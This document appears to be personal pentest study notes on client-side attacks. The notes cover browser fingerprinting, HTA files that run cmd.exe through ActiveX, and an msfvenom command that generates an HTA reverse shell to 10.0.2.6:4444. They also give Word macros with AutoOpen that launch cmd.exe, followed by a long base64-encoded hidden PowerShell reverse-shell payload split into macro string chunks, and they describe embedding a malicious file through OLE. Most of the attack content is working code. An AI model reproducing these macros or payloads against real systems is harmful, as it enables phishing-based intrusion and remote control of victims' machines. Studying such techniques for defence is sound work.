# Client-Side Attacks

#### Introduction

we seek to exploit user like XSS

<figure><img src="../.gitbook/assets/Screenshot 2025-04-01 143000.png" alt=""><figcaption></figcaption></figure>

#### Know your target

* **Passive Client Information Gathering**
  * identifying the victim’s browser
* **Active Client Information Gathering**
  * social engineering and client-side attacks

***

#### Leveraging HTML Applications

*   **Exploring HTML app**

    ```bash
    wget <https://github.com/Valve/fingerprintjs2/archive/master.zip>
    unzip master.zip
    sudo mv fingerprintjs-maaster /var/www/html/fp # move it and rename
    sudo systemctl start apache2 
    ```

    to know the information of browser

    [https://www.whatismybrowser.com/](https://www.whatismybrowser.com/)
*   **HTA attack in Action**

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <body>
      <script>
        var x="cmd.exe"
        new ActiveXObject('WScript.shell').Run(x)
      </script>
    </body>
    </html>
    ```

    which this code is saved on `code.hta` , hta→ just running on _**internet explorer**_

    <figure><img src="../.gitbook/assets/Screenshot 2025-04-01 151329.png" alt=""><figcaption></figcaption></figure>

    **Take Reverse shell**

    ```bash
    sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 LPORT=4444 -f hta-psh -o /var/www/html/fp/playground/evil.hta

    # hta-psh -> to identify format of file is hta  
    ```

#### Microsoft Word Attack

*   **Macros**

    which use to automate any task

    ```bash
    Sub test1()

    CreateObject("WScript.Shell").Run "cmd.exe"

    End Sub
    # which we use it to run cmd by Macros
    ```

    ```bash
    Sub AutoOpen()
    test1
    End Sub
    Sub Doc()
    test1
    End Sub
    Sub test1()

    CreateObject("WScript.Shell").Run "cmd.exe"

    End Sub
    # when u open word file the cmd auto open
    ```

    then we create a reverse shell payload and divide it to parts by python

    <figure><img src="../.gitbook/assets/Screenshot 2025-04-01 161451.png" alt=""><figcaption></figcaption></figure>

    so let’s copy the output and past it in `macros`

    ```bash
    Sub AutoOpen()
    test1
    End Sub
    Sub Doc()
    test1
    End Sub
    Sub test1()

    Dim Str As String # to define string in Marcos

    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
    Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
    Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
    Str = Str + "wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB"
    Str = Str + "vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A"
    Str = Str + "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ"
    Str = Str + "AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU"
    Str = Str + "wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB"
    Str = Str + "tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A"
    Str = Str + "CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA"
    Str = Str + "AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc"
    Str = Str + "gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB"
    Str = Str + "5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA"
    Str = Str + "GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
    Str = Str + "AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe"
    Str = Str + "gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB"
    Str = Str + "jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A"
    Str = Str + "FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4"
    Str = Str + "AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd"
    Str = Str + "AByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAewAxAH0AagB"
    Str = Str + "uADYAMgBjAEMAQQA3AFYAewAyAH0AYgB7ADIAfQAvAGkATwBCA"
    Str = Str + "EQAKwB2AHQATAAnACcAKwAnACcAKwBoADIAaQBGAGwARQBTAGk"
    Str = Str + "AdgBKAFgAYgBiAGkAdQB0AGQAQQBtAHYAbwBhAFEARgBVAGsAS"
    Str = Str + "wBCAFEAeQBjADMAYwBSAEsARABpAHsAMgB9AG4AaQA4AEwAYQA"
    Str = Str + "zAC8ALwAzAEcAawAnACcAKwAnACcATABSAFUAYgBlADkANgBKA"
    Str = Str + "DYAMABsAFIARABLAGUARwBZACsAZgBlAHsAMgAnACcAKwAnACc"
    Str = Str + "AfQBZAG0AWABoAEkANgBuAEwAQgBRAGUAbgB6ADgASgB2ADMAN"
    Str = Str + "AAvAEUAbABLAFYAdwA5AEYAYQBDAGsAcABPAFUAUgBJAFgAcwB"
    Str = Str + "xAHQAdwBvADEAdgBxAGMAKwA3AHUAZABDAFIAdgBrAHYASwBWA"
    Str = Str + "EYAdQB0ADYAbQB5AEoAUwBEAGkANwB1AHEAbwBsAFUAWQBSAEQ"
    Str = Str + "AZgBuAHcAdgB0AEQARABYADQAaABnAHYASAB5AGoAQgBzAGEAS"
    Str = Str + "gBLAGYAMABtAGoAQQBFAGYANAA3AFAAWgBoAGoAaAAwAHUALwB"
    Str = Str + "aAEIAeQBmAHgAWgBhAGwARAAwAGcAbQBxAHIAdABhAHMAZwBKA"
    Str = Str + "HMASABTAG0AaABhADcAWQA2AHoASQBIAGkAYgBnAEsAMQBvAG8"
    Str = Str + "AUwByAHMAaAAvAC8AQwBHAHIAMAA3AFAAeQByAHsAMQB9AEIAN"
    Str = Str + "ABUAEIAQwB7ADEAfQBGAGQAbgBhAHgAUgB3AHYAQwB5ADYAbAB"
    Str = Str + "zAGkAcgA5AFYATQB7ADIAfQBCAGQANwBzAFYAVgBtAFMAVABPA"
    Str = Str + "EIARwBMAG0AYwBjAEwASQB4AEsAZQBWAHcAcgBEAE0ARQBZAGU"
    Str = Str + "AdgAnACcAKwAnACcAZwBGAHYAYQAyAHgAaQBIAGoAQQAzAGwAd"
    Str = Str + "QBFAHEAegA1AGUASgBNAEUAKwBpAFUAewAxAH0AeABKAE8ARAB"
    Str = Str + "tAHEAJwAnACsAJwAnAEsARABJADgAOQBpAEwAbQBhAEsANABiA"
    Str = Str + "DQAVABpAHsAMgB9ADgAOQBKAFUAdQBKAC8ATwBaAHIAOAByADA"
    Str = Str + "ALwBUAHMAUQBSAEoAeQBzAHMAUQBGAEkAKwBRADQAWQBpAHMAT"
    Str = Str + "ABSADIAdgBpADQATABqAFEAUgBxAEYATAA4AFEAQgA3AE0ANwB"
    Str = Str + "DAHkAZQBFAFIAQwBmADYAYQBxACcAJwArACcAJwBvAEwAWgBtA"
    Str = Str + "EMANgB6AGsAdwBvAFQAUwB2AFAAUgBmADMAQwBnADMAZQBKAE0"
    Str = Str + "AaAA5ADEARQBqADUAZABRAEkAdABIAG8AOABVAHYATwBRADAAR"
    Str = Str + "gBlADMAewAxAH0ASgBtAGIAVQBIAHkAMABrADkAOABJAFUAMQA"
    Str = Str + "nACcAKwAnACcAQgBBAGgAZgBWAEUAQQB3AEQAdgBwADgARABQA"
    Str = Str + "HkANgBnAHoAWAA5AHQAdgBVAE8AZABaACcAJwArACcAJwBrAEs"
    Str = Str + "AMwBwAFkAUQBkAEQAdwBFAHEAUAB4AGUAUgBnACsAMQAwAHEAN"
    Str = Str + "QBTAFUAVABEAGsAZQBjAFIAVAB0ADQAegBkADEARgBDAFYAWgB"
    Str = Str + "uAFQAMwBCAEwATwBUAGIATwBmADkAUgBYAE8AVABNAEUAcwB5A"
    Str = Str + "DMARgBEAEUAUgBUAG0AeABGADMAJwAnACsAJwAnADkAdQB6AGc"
    Str = Str + "AUgBlAHAAegBtADkASwBsADAASABtAGYAeAAzAFgAcwBrAFIAR"
    Str = Str + "ABYAGQAeQBGAGEARQBpAGUAagBxAHYASgB7ADIAfQBRAHIAQgB"
    Str = Str + "IADgAUQBHAFAAUQBxAFoAMgBBAHcARQBxAGMAcgBxAEIAMwBUA"
    Str = Str + "HEAbQAyAEUAZABjAGcAQwB4ADQAOABjAHEAcwBzAFMAVAA4AHk"
    Str = Str + "AVgBaAFAAQwBIAFYAeABwAEQAbQBRADEAQgBpAGkAZwBuAHkAJ"
    Str = Str + "wAnACsAJwAnAHIATAA0AE0ANQA1AGsAMgBSAGoAZABEAEUAUwA"
    Str = Str + "4AEQAdQArAEEANQBFAHoAWABsAFEASQBEAGoAVABUAG8AdABpA"
    Str = Str + "GwANQAwAHUAMwBrAEYASgByAGwARQBVAHgAMwBtAHAAbAAwAEM"
    Str = Str + "ARgBPAG4AbgBKAHcAbwBoAGkAewAxAH0AeQA5AHAAWQBVAHoAU"
    Str = Str + "wBMAFMAMwBoADcAUABBAG8AUAA0AGQAcgBKAHAAUQBUAEIAOAB"
    Str = Str + "VADgAYwB6AGQAVABYADYASwBaAG4AbABwAGoAWQBjAHkAagB4A"
    Str = Str + "EkARwBrAEEAZwBKADMAMQBnAG8ANwBCAEYARQBCAFMARgA1AHE"
    Str = Str + "ARQB4AGYAcgBPADQAdgA0ADIAZQBuAHkAbQAzAEQAVQBFAEsAV"
    Str = Str + "gBRAE8AZQBCAHAARABlAGsAQQBpAFkARABCADQAbwBJAHEARQB"
    Str = Str + "RAFEASwB0AEYAQQBMAEYAdQBiAEcAYwBrAFgAeABFAGoAUQBPA"
    Str = Str + "DcAYQBKAEoAawBRAC8AewAxAH0ASQBhADIATwBBADcATwBRAGo"
    Str = Str + "AMQAnACcAKwAnACcAMwA1ADcAUwBpAHoASwBqAGgAUwBYAHEAQ"
    Str = Str + "wBTAHcAWABFAFMASQA2AFQAYQBvAG8AegBuAEoAWgB0AEUASAB"
    Str = Str + "IAHEAUABRAEYAaAB3ADYAMwArAEUAOABMAHIAbgBpAEYAaABxA"
    Str = Str + "EUAVQA3AHoAbwBtAFMAbAB7ADEAfQBkAFYAMwBYAEoAQQAvADU"
    Str = Str + "AdwBVAFQAdwBjADgAVQBuAFEATQB7ADIAfQBFAFEAYwBjAG0Aa"
    Str = Str + "ABGAGIANgBpAGoARwBYADYAdgBIAC8AcQBKADgASwBkACcAJwA"
    Str = Str + "rACcAJwA2AFMAbQBnAFoAcgBiAEkAVABVAGQAUABRAEYASwB7A"
    Str = Str + "DIAfQBzAGIAVQBqAFoATQArAEEAMwBKAHUAYwBIAHEARgArADU"
    Str = Str + "AMQBaADkANAAnACcAKwAnACcAdQBSAHYAVgB0ADQARwBsAEcAY"
    Str = Str + "gBKAGoAJwAnACsAJwAnAHQAWAByADMAZgBiAGwAZgBYAEg"
    CreateObject("WScript.Shell").Run Str # replace cmd.exe with the payload 

    End Sub

    ```
*   **object linking and embedding**

    insert malicious file in word file

    ```bash
    insert -> object -> create from file -> browse
    # which this file has a shell
    ```

    <figure><img src="../.gitbook/assets/Screenshot 2025-04-01 180910.png" alt=""><figcaption></figcaption></figure>
